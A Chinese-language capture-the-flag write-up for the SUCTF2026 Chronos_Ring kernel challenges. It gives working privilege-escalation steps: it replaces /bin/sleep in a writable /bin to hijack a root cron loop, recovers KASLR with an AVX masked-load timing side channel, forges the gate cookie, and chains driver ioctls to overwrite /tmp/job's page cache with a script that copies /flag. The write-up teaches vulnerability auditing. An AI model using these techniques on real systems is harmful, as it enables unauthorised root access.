# SUCTF2026-Chronos_Ring / Chronos_Ring1

## 题目简述

这两个题目使用同一套 Linux 内核环境：启动脚本加载 `chronos_ring.ko`，把 `/dev/chronos_ring` 设为 `0666`，并让 root 每 3 秒执行一次 `/tmp/job`。

官方资料给出的预期层次不同：

- `Chronos_Ring` 是配置型捷径：`/bin` 目录可写，而 root 定时任务会调用 `sleep`，替换 `/bin/sleep` 即可让 root 修改 `/flag` 权限；
- `Chronos_Ring1` 是内核利用：先用 AVX 时序侧信道恢复 KASLR，再绕过与 `kfree` 地址绑定的 cookie，最后利用 `chronos_ring` 状态机把脚本写入 `/tmp/job` 的 page cache。

仓库归档中的两个 `chronos_ring.ko` 和两个 `initramfs.cpio.gz` 哈希分别相同，参赛队总 WP 也用同一条内核链打通了两个实例。本文因此合并记录，但会区分简单题的官方捷径、Ring1 的官方预期链，以及源码中实际存在的更短利用路径。

## 解题过程

### 1. 启动环境与攻击目标

`init` 中的关键逻辑为：

```sh
insmod /chronos_ring.ko
chmod 666 /dev/chronos_ring

echo '#!/bin/sh' > /tmp/job
echo "echo 'Root helper is running safely...'" >> /tmp/job
chmod 644 /tmp/job
(
    while true; do
        /bin/sh /tmp/job > /dev/null 2>&1
        sleep 3
    done
) &
```

`/flag` 的属主是 root、权限为 `0400`。因此不论走配置漏洞还是内核漏洞，最终目标都是劫持 root 周期任务：让它修改 `/flag` 权限，或复制 flag 到普通用户可读的位置。

### 2. Chronos_Ring：利用可写的 `/bin`

initramfs 中 `/bin` 的权限为 `0777`。启动时执行 `busybox --install -s`，所以 `/bin/sleep` 是指向 BusyBox 的符号链接。不能直接用重定向覆盖该链接，否则会沿链接截断 `/bin/busybox`；应先删除链接，再创建独立脚本：

```sh
rm /bin/sleep
cat > /bin/sleep <<'EOF'
#!/bin/sh
chmod 644 /flag
EOF
chmod 755 /bin/sleep
```

后台 root shell 下一次执行 `sleep 3` 时会运行该脚本。随后读取：

```sh
cat /flag
```

这条路径不需要分析内核模块，是 `Chronos_Ring` 官方 README 所指的初级解法。识别重点不是“某个二进制本身可写”，而是 root 的 `PATH` 中存在普通用户可替换的命令入口。

### 3. Ring1 的 ioctl 状态机

最终源码定义了以下接口：

| ioctl | 作用 |
|---|---|
| `0x1001 CHRONOS_REG_BUF` | 创建一页大小的本地 `local_ring` |
| `0x1002 CHRONOS_SET_OPTS` | 校验 KASLR 相关 cookie，打开 gate |
| `0x1003 CHRONOS_PIN_USER_PAGE` | pin 一个用户页；这是开启同步的前置条件 |
| `0x1004 CHRONOS_ATTACH_FILE` | 挂接指定文件的 page cache 页 |
| `0x1005 CHRONOS_ENABLE_SYNC` | 创建 private 或 file-backed `sync_view` |
| `0x1006 CHRONOS_DETACH_FILE` | 解除文件绑定并把模式退回 LOCAL |
| `0x1007 CHRONOS_UPDATE_BUF` | 仅在 LOCAL 模式下写 `local_ring` |
| `0x1008 CHRONOS_COMMIT_SYNC` | 把 `local_ring` 内容复制到 `sync_view` |

`ATTACH_FILE` 并不按完整路径比较，而是对文件 basename 做 FNV-1a：

```c
static bool chronos_is_target_name(struct file *f) {
    return chronos_fnv1a(f->f_path.dentry->d_name.name) == 0xddd42fdc;
}
```

`0xddd42fdc` 对应字符串 `job`，结合启动脚本即可确定目标是 `/tmp/job`。

### 4. 用 AVX 时序侧信道绕过 KASLR gate

最终源码中的 cookie 公式为：

```c
material = (uint64_t)kfree >> 21;
cookie = rol64(material ^ 0x9e3779b97f4a7c15, 17) ^ session_idx;
```

内核中 `kfree` 相对基址的偏移为 `0x3762b0`。环境没有直接地址泄漏，官方 exp 使用 `vmaskmovps` masked load 测量候选内核地址的访问时延：已映射、热点内核页与未映射地址会呈现可统计的时序差异。

侧信道最小流程是：

1. 在 `0xffffffff80000000` 至 `0xffffffffc0000000` 范围按固定步长扫描；
2. 每个地址先经过序列化 syscall，再用 `rdtsc` 包围 `vmaskmovps`；
3. 丢弃若干预热轮，对约 100 轮结果求均值；
4. 取耗时最低的热点地址，多次扫描降低噪声；
5. 官方样例把热点地址减去约 `0x1600000` 得到内核基址，再加 `0x3762b0` 得到 `kfree`；若机器噪声导致热点漂移，应在结果附近按 2 MiB 对齐枚举候选 base，并以 `CHRONOS_SET_OPTS` 返回值作 oracle。

计算代码如下：

```c
static inline uint64_t rol64(uint64_t value, unsigned shift) {
    return (value << shift) | (value >> (64 - shift));
}

uint64_t kfree_addr = kernel_base + 0x3762b0;
uint32_t session_idx = 0x1337;
uint64_t cookie = rol64(
    (kfree_addr >> 21) ^ 0x9e3779b97f4a7c15ULL,
    17
) ^ session_idx;

struct chronos_set_opts_req opts = {
    .cookie = cookie,
    .session_idx = session_idx,
};
ioctl(fd, CHRONOS_SET_OPTS, &opts);
```

参赛队总 WP 对比赛样本反编译得到的是另一版 `0x1002` 校验：把 `kfree` 地址掩码后与 `0xf372fe94f82b3c6e` 异或，并按 2 MiB slide 枚举。该公式与仓库最终源码及官方 exp 不一致，说明附件版本发生过变化；复现仓库版本时应使用上面的 `rol64` 公式，不能混用旧样本常量。

### 5. 官方预期：状态与 view 生命周期错配

`ENABLE_SYNC` 在 FILE 模式下会为 `sync_view` 保存文件 page，并额外 `get_page()`：

```c
get_page(buf->file_page);
new_view->page = buf->file_page;
new_view->vaddr = kmap(new_view->page);
new_view->type = VIEW_FILE_BACKED;
rcu_assign_pointer(buf->sync_view, new_view);
```

随后 `DETACH_FILE` 把模式改回 LOCAL，并释放 `attached_file` 和 `file_page`，却没有清理 `sync_view`：

```c
buf->mode = CHRONOS_MODE_LOCAL;
fput(buf->attached_file);
put_page(buf->file_page);
buf->sync_state = SYNC_DISABLED;
/* buf->sync_view 仍保留 */
```

这里更准确的描述是“残留的 file-backed view”或“状态/授权错配”，不是内存 UAF：`sync_view` 自己持有的 page 引用仍然有效。漏洞在于逻辑状态已经宣称同步禁用、模式已经退回 LOCAL，但 `COMMIT_SYNC` 不检查 `mode` 或 `sync_state`，仍会通过 RCU 解引用旧 view：

```c
rcu_read_lock();
view = rcu_dereference(buf->sync_view);
if (view && view->vaddr) {
    memcpy(view->vaddr + req.off,
           buf->local_ring + req.off,
           req.len);
    if (view->type == VIEW_FILE_BACKED)
        set_page_dirty(view->page);
}
rcu_read_unlock();
```

官方 exp 的完整顺序为：

```text
SET_OPTS(cookie)
REG_BUF
PIN_USER_PAGE
ATTACH_FILE(/tmp/job, page 0)
ENABLE_SYNC
DETACH_FILE                 # 回到 LOCAL，但保留 file-backed view
UPDATE_BUF(shell script)    # LOCAL 状态下允许写 local_ring
COMMIT_SYNC                 # 仍写入 /tmp/job 的 page cache
```

payload 可以是：

```sh
#!/bin/sh
cp /flag /tmp/flag
chmod 777 /tmp/flag
exit
```

等待后台任务执行后读取 `/tmp/flag` 即可。

### 6. 源码中还存在无需 DETACH 的短链

逐函数检查可以发现，官方预期的 `DETACH_FILE` 并非必要条件：`UPDATE_BUF` 只检查调用当时是否为 LOCAL，而 `COMMIT_SYNC` 不检查提交时的 mode、同步状态或文件写权限。因此可以先写本地 buffer，再挂接文件并提交：

```text
SET_OPTS(cookie)
REG_BUF
PIN_USER_PAGE
UPDATE_BUF(shell script)    # 此时仍是 LOCAL
ATTACH_FILE(/tmp/job, 0)
ENABLE_SYNC                 # 获得 file-backed view
COMMIT_SYNC                 # 直接覆盖只读打开的 page cache
```

参赛队总 WP 使用的就是这一思路：先准备匿名 buffer，再建立 `/tmp/job` 的 file-backed view，最后 commit。它说明根本问题不只在 `DETACH_FILE` 漏清指针，还在于：

- `ATTACH_FILE` 接受 `O_RDONLY` 文件，却允许后续获得可写 kmap；
- `COMMIT_SYNC` 没有重新验证当前状态和写权限；
- `UPDATE_BUF` 与 `COMMIT_SYNC` 的授权条件可以跨状态拼接。

因此，审计状态机时不能只看每个 ioctl 单独是否合理，还要检查攻击者能否把不同时间点满足的条件组合成越权序列。

## 方法总结

`Chronos_Ring` 的最短解法是配置审计：root 定时任务调用的命令位于普通用户可写目录，替换 `/bin/sleep` 即可获得读取 flag 的权限。`Chronos_Ring1` 则先用 AVX masked-load 时序差异恢复 KASLR，按最终源码的 `rol64((kfree >> 21) ^ constant, 17) ^ session_idx` 公式打开 gate，再利用 page cache 同步逻辑改写 `/tmp/job`。

内核部分真正可复用的经验有两点。第一，RCU 保护只保证对象访问期的内存安全，不会自动保证业务状态正确；这里的 view 仍然存活，但已经不应再获得提交权限。第二，状态机漏洞要按调用序列审计：即使官方预期是 `ATTACH → ENABLE → DETACH → UPDATE → COMMIT`，源码还允许 `UPDATE → ATTACH → ENABLE → COMMIT`，后者揭示了更基础的跨状态授权缺失。遇到官方 WP、比赛总 WP 与归档源码不一致时，应固定样本版本，并以对应源码和二进制的实际公式为准。
